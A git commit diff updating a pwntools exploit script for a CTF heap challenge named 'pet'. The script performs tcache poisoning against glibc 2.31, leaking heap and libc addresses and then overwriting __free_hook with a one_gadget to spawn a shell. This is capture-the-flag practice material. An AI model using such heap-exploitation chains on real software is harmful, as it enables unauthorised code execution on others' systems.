c456395a859902259314b5b40ad74d4aaac680e3
CuteCabbge <cc2414635846@163.com>
2022-11-06 21:51:39 +0800

    pet WP

--- NPU/pet/exp.py
+++ NPU/pet/exp.py
@@ -3,12 +3,10 @@ from pwn import *
 from LibcSearcher import * 
 # context.log_level = 'debug' 
 
-p=process('./pet-copy')
-# p=remote('t.ctf.qwq.cc',49619)
+p=process('./pet')
+# p=remote('t.ctf.qwq.cc',49637)
 # elf=ELF('./pet')
-# libc=ELF('./libc.so.6')
-libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')
-# p=gdb.debug(['/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6', './pet-copy'], env={'LD_PRELOAD': '/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/ld-2.31.so '})
+libc=ELF('./libc.so.6')
 def add():
     p.recvuntil(b'> ')
     p.sendline(b'1')
@@ -33,19 +31,10 @@ def comment(comment):
     p.sendline(b'5')
     p.recvuntil(b'comment ^-^\n')
     p.sendline(comment)
-# p.interactive()
-# pause()
-add()
-
-# comment(p64(0)*2+p8(0))
 add()
 add()
-# free(0)
-# gdb.attach(p)
+add()
 free(1)
-gdb.attach(p)
-
-# gdb.attach(p)
 edit(0,b'a'*0x40)
 show(0)
 p.recvuntil(b'a'*0x40)
@@ -55,41 +44,29 @@ edit(0,p64(0)*6+p64(0x61)+p64(0))
 add()
 free(2)
 free(1)
-edit(0,p64(0)*6+p64(0x61)+p64(getaddr+0x800))
-# gdb.attach(p)
-
+edit(0,p64(0)*6+p64(0x61)+p64(getaddr+0x7a0))
 add()
 add()
-edit(2,b'a'*0x50)
-
-# gdb.attach(p)
+edit(2,b'a'*0x40)
 show(2)
-p.recvuntil(b'a'*0x50)
+p.recvuntil(b'a'*0x40)
 libcaddr=u64(p.recv(6).ljust(8,b'\x00')) #libc地址
 print('libcaddr:',hex(libcaddr))
-libcbase=libcaddr-libc.sym['_IO_file_jumps']
+libcbase=libcaddr-libc.sym['_IO_2_1_stderr_']
 print('libcbase:',hex(libcbase))
 free_hook=libcbase+libc.sym['__free_hook']
 print('free_hook:',hex(free_hook))
-one_gadget=libcbase+0xe3b04
+one_gadget=libcbase+0xe3b01
 system_addr=libcbase+libc.sym['system']
 edit(2,b'\x00'*0x50)
+free(2)
+add()
 
-# gdb.attach(p)
-
-edit(0,p64(0)*6+p64(0x61)+p64(free_hook-0x20))
-free(0)
+free(2)
 free(1)
+edit(0,p64(0)*6+p64(0x61)+p64(free_hook-0x40))
 add()
 add()
-# free(2)
-gdb.attach(p)
-comment(b'a')
-add()
-add()
-comment(b'/bin/sh\x00')
-pause()
-add()
-
-# 0x000055b5a16a9a50
-# 0x000055feb04205e0
+edit(2,p64(0)*3+p64(one_gadget))
+free(0)
+p.interactive()
